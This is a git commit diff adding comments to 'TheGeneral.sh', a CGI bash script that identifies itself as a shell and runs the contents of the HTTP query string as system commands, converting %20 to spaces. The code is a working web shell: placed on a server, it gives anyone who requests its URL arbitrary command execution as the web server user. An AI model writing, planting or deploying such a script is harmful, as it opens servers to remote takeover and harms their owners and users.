18a00609c45ab161faece9bcff792fcc5e0e74ef
joshingeneral <Joshingeneral@gmail.com>
2013-02-18 23:09:42 -0500

    Update TheGeneral.sh
    A few edits and commenting of code

--- TheGeneral.sh
+++ TheGeneral.sh
@@ -3,11 +3,17 @@ echo Content-type: text/plain
 echo 
 echo Shell Created by The General
 echo 
+
+#Show who you are running as:
 user=`whoami`
 echo "Running as user:$user"
-#echo whoami
+
+#Read In Varibles and interprete as commands 
 cmd=$QUERY_STRING
+
+#Rewrite so we can use spaces without URL encoding being a problem
 cmd2=`echo $cmd | sed 's!%20!\ !g'`
+
 #uncomment if you want to see what is being run
 #echo (`echo $QUERY_STRING | sed 's!%20!\ !g'`) 
 $cmd2
